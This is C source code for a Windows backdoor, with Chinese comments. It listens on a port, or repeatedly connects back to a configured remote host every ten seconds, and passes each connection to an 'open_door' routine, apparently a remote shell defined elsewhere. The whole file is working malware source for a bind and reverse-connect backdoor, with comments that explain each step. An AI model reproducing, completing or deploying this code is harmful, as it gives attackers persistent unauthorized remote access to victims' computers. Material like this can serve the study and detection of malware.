#include <stdio.h>
#include <winsock.h>
#include <windows.h>
#include "door.h"
struct  sockaddr_in local;

extern int g_port;
extern int g_remote_port;
extern char g_remote_host[64];
extern int g_rconnect;

int main() {
    //初始化下
    init_door();

    WSADATA WSA;
    //初始化Winsock库,确认所用的版本
    if ((WSAStartup(MAKEWORD(2,2),&WSA)) != 0) {
		printf("[e]Load WINSOCK Failed!\n");
		return -1;
	}
    
    SOCKET sock_serv, sock_lis;
    //充填sockaddr_in结构
    //任意目标地址
    local.sin_addr.S_un.S_addr=INADDR_ANY;
    //协议AF_INET
    local.sin_family = AF_INET;
    //设置监听端口
    local.sin_port = htons(g_port);  //host to network

    int localsize = sizeof(struct sockaddr_in);

    if (!g_rconnect) { //g_rconnect == 0就是监听模式
        //获取一个套接字
        sock_lis = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock_serv == INVALID_SOCKET){
            printf("[e]socket error!\n");
            return -1;
        }

        //将套接字和sockaddr_in结构绑定
        bind(sock_serv, (struct sockaddr*)&local, sizeof(struct sockaddr));
        //开始监听
        listen(sock_serv, 3);
        printf("[+]Begin to Listen...on port %d\n", g_port);
        
        //accept函数将进入阻塞状态, 如果有连接请求, 阻塞解除
        //然后该函数将返回一个新的套接字描述符.用于指定这个连接
        sock_lis = accept(sock_serv, (struct sockaddr*)&local, &localsize);
        if (sock_lis == INVALID_SOCKET){
            printf("[e]Accept error:%d\n", WSAGetLastError());
            return -1;
        }

        //发送数据
        puts("[+]Accept the connection...And send data...");
        open_door(sock_lis);

    } else {  //否则就是反向连接
        
        //将远程主机的端口赋与sockaddr_in的成员
   		local.sin_port = htons(g_remote_port);
        //接着是地址. inet_addr函数能把char类型的IP转换成
        //能被识别的唯一的32位整数(网络标识) 
        
		local.sin_addr.s_addr = inet_addr(g_remote_host);
	    //如果转换后是一个不可用的地址, 就进行域名解析
        if (INADDR_NONE == local.sin_addr.s_addr) {
            //gethostbyname函数能把域名转换成
            //唯一的32位整数(网络标识)
            printf("[+]Look up host\n");
			struct hostent *host = gethostbyname(g_remote_host);
			if (NULL != host)
				memcpy( &local.sin_addr,
                        host->h_addr_list[0],
                        host->h_length ); 
		}
		sock_serv = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) ;
        
		while (1){
            //使用connect函数进行连接.返回0就是连接成功
			if (0 == connect(sock_serv, (struct sockaddr *)&local, sizeof(local))) {
			    open_door(sock_serv);
            } else {
			    Sleep(10000);
            }
		}
    }

    //关闭套接字
    shutdown(sock_lis, SD_BOTH);
	closesocket(sock_lis);
    puts("[+]Close Socket...");

	WSACleanup();
    return 0;
}

